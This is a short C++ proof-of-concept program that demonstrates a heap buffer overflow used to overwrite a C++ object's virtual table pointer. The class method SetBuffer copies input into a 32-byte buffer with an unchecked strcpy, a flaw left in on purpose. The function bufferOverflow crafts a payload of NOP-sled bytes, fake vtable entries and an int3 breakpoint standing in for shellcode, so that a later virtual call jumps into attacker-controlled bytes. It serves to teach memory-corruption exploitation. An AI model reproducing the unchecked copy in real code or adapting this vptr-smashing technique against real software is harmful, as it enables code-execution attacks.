#include <iostream>
#include <string.h>
#include <malloc.h>

using std::cout;
using std::endl;

class BaseClass {
    public:
        void SetBuffer(const char * str)
        {
            strcpy(buffer, str);
        }

        virtual void PrintBuffer()
        {
            printf("%s\n", buffer);
        }

    private:
        char buffer[32];
};

class MyClass1 : public BaseClass {
    public:
        void PrintBuffer()
        {
            printf("MyClass1: ");
            BaseClass::PrintBuffer();
        }
};

class MyClass2 : public BaseClass {

    public:
        void PrintBuffer()
        {
            printf("MyClass2: ");
            BaseClass::PrintBuffer();
        }
};


char * bufferOverflow(unsigned long addr, int naddr, int vptrOffset) {
    char * buffer;
    unsigned long * longBuffer;
    unsigned long ccOffset;
    int i;

    buffer = (char *)malloc(vptrOffset + 4 + 1);
    ccOffset = (unsigned long)vptrOffset - 1;

    for (i = 0; i < vptrOffset; ++i) buffer[i] = '\x90';

    longBuffer = (unsigned long *)buffer;

    for (i = 0; i < naddr; ++i) longBuffer[i] = addr + ccOffset;

    longBuffer = (unsigned long *)&buffer[vptrOffset];

    * longBuffer = addr;
    buffer[ccOffset] = '\xCC';  // int3

    buffer[vptrOffset+4] = '\x00'; // null-byte

    return buffer;
}


int main(int argc, char * argv[]) {

    BaseClass * objects[2];
    objects[0] = new MyClass1;
    objects[1] = new MyClass2;

    objects[0]->SetBuffer(bufferOverflow((unsigned long)&(* objects[0]), 4, 32));
    objects[1]->SetBuffer("string");
    objects[0]->PrintBuffer();
    objects[1]->PrintBuffer();

    // dealloc
    for (int i = 0; i < 2; i++)
        delete objects[i];

    return 0;
}
